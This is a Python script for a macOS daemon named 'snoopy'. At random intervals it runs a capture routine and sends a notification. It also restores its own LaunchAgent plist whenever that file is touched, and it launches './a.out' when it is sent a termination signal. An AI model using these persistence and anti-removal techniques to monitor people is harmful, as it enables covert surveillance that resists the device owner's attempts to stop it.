#!/usr/bin/env python

import imp
import sys
import os
import time
import signal
import random
import notifier
import shutil
import subprocess
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler
# from daemon import Daemon

# imp.load_source('catcher', './{}/capture.py'.format(sys.platform))
from darwin import capture as catcher

directory      = '{}/code/snoopy'.format(os.getenv("HOME"))
debug_file     = '{}/log'.format(directory)
launchd_path   = '{}/Library/LaunchAgents'.format(os.path.expanduser("~"))


def debug(message):
    with open(debug_file, 'a') as f:
        f.write('{}\n'.format(message))


def get_plist_filename(s=None):
    suffix = '.{}'.format(s) if s else ""
    return 'com.reedcwilson.snoopy{}.plist'.format(suffix)


class GracefulKiller:
    kill_now = False

    def __init__(self, filename):
        signal.signal(signal.SIGHUP, self.exit_gracefully)
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.filename = filename

    def exit(self):
        sys.exit(0)

    def exit_gracefully(self, signum, frame):
        self.kill_now = True
        with open(self.filename, 'w') as f:
            f.write('goodbye')
        pid = os.fork()
        if pid == 0:
            subprocess.call(['./a.out'])
        self.exit()


class FileEventHandler(PatternMatchingEventHandler):
    def __init__(self):
        PatternMatchingEventHandler.__init__(
            self,
            patterns=["*com.reedcwilson.snoopy*"],
            ignore_directories=True)

    def on_any_event(self, event):
        # TODO: notify if something happens to the file
        filename = get_plist_filename()
        shutil.copy(
            '{}/{}'.format(directory, filename),
            '{}/{}'.format(launchd_path, filename))


class MyDaemon():
    killer = None
    path = launchd_path

    def __init__(self, pidfile, killer):
        self.killer = killer

    def run(self):
        event_handler = FileEventHandler()
        self.observer = Observer()
        self.observer.schedule(event_handler, self.path, recursive=False)
        self.observer.start()
        while True:
            catcher.capture(directory)
            notifier.send()
            time.sleep(random.randint(120, 600))


def main():
    filename = '{}/close-{}'.format(directory, os.getpid())
    killer = GracefulKiller(filename)
    daemon = MyDaemon('/tmp/snoopy.pid', killer)
    daemon.run()


if __name__ == "__main__":
    main()
